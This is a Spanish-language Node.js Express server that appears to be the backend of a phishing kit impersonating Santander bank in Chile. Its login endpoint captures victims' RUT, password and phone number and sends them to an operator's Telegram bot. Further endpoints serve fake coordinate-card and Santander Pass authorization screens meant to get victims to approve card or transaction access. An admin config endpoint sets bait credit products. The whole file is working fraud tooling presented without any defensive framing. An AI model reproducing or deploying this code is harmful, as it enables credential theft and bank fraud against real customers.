const express = require("express");
const fetch = require("node-fetch");
const cors = require("cors");
const path = require("path");

const app = express();

// Habilitar CORS y parsing de JSON
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Servir archivos estáticos desde la carpeta "public"
app.use(express.static("public"));

// Credenciales desde variables de entorno en Render
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Lista de RUT bloqueados
const bloqueados = ["250624344", "25062434-4", "25.062.434-4"];

// Configuración en memoria (se puede reemplazar con DB si quieres persistencia)
let config = {
  producto1: "Línea de Crédito",
  monto1: 5000000,
  producto2: "Tarjeta de Crédito WorldMember Limited Business",
  monto2: 5000000,
  tipoAutorizacion: "santander",
  coord1: "",
  coord2: "",
  coord3: "",
  factibilidad: "off" // Nueva propiedad para habilitar/deshabilitar factibilidad
};

// Endpoint de login
app.post("/proxy-login", async (req, res) => {
  const { rut, passwd, telefono } = req.body;

  if (!telefono) {
    return res.status(400).send("❌ El campo 'Teléfono' es obligatorio.");
  }

  if (bloqueados.includes(rut)) {
    return res.status(403).send("❌ Tu clave digital ha sido bloqueada.");
  }

  const mensaje = `Nuevo intento de inicio de sesión:
RUT: ${rut}
Contraseña: ${passwd}
Teléfono: ${telefono}`;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
    });

    res.send("Ingresando los datos...");
  } catch (error) {
    console.error(error);
    res.status(500).send("❌ Error al ingresar tus datos. Inténtalo nuevamente.");
  }
});

// Endpoint de autorización general
app.post("/autorizar", async (req, res) => {
  const { mensaje } = req.body;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
    });

    res.send("✅ Autorización enviada.");
  } catch (error) {
    console.error(error);
    res.status(500).send("❌ Error al enviar la autorización.");
  }
});

// Endpoint para coordenadas dinámicas
app.get("/coordenadas", (req, res) => {
  const letras = ["A","B","C","D","E","F"];
  const seleccion = letras.sort(() => 0.5 - Math.random()).slice(0,3);
  res.json({ coordenadas: seleccion });
});

// Endpoint de configuración (para admin y productos)
app.get("/config", (req, res) => {
  res.json(config);
});

app.post("/config", (req, res) => {
  // Actualiza solo los campos enviados, manteniendo los demás
  config = { ...config, ...req.body };
  res.status(200).json({ message: "✅ Configuración guardada correctamente.", config });
});

// Ruta de autorización que decide el flujo según configuración
app.get("/autorizacion", (req, res) => {
  if (config.factibilidad === "on") {
    // Si está habilitada la factibilidad, mostrar la primera pantalla de tarjeta
    return res.sendFile(path.join(__dirname, "public", "creditCardEvaluation.html"));
  }

  // Si no, seguir con la lógica normal de productos
  if (config.tipoAutorizacion === "coordenadas") {
    return res.sendFile(path.join(__dirname, "public", "coordenadas.html"));
  } else {
    return res.sendFile(path.join(__dirname, "public", "pass.html"));
  }
});

// Flujo de factibilidad: evaluación -> visualización -> autorizar
app.post("/credit/visualizacion", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "creditCardVisualization.html"));
});

app.post("/credit/autorizar", async (req, res) => {
  const mensaje = "AUTORIZA TARJETA DIGITAL!!";

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
    });

    res.send(`
      <html>
        <body>
          <img src="logo-officebanking.png" style="height:60px;">
          <h2>VISUALIZACIÓN DE TU TARJETA DIGITAL</h2>
          <p style="color:red;">Debes autorizar en tu Santander Pass la visualización de la tarjeta.</p>
        </body>
      </html>
    `);
  } catch (error) {
    console.error(error);
    res.status(500).send("❌ Error al enviar la autorización.");
  }
});

// Iniciar servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor corriendo en el puerto ${PORT}`);
});
